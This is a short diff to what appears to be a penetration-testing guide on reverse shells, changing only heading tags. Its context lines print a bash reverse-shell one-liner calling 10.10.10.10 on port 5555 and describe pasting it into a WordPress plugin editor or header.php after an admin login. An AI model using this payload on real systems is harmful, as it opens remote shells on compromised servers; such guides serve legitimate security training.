@@ -93,13 +93,13 @@ Then Press <b>"CTRL+D"</b> again to return to the reverse-shell.
 
 /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.10/5555 0>&1'
 
-<b>Wordpress example 1.</b>
+<u>Wordpress example 1.</u>
 
 After logging in to the admin panel open the Plugin editor, in the bottom of a plugin.
 
 Add <code>/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.10/5555 0>&1'</code>
 
-<b>Wordpress example 2.</b>
+<u>Wordpress example 2.</u>
 
 <b>Edit "header.php" </b>
 
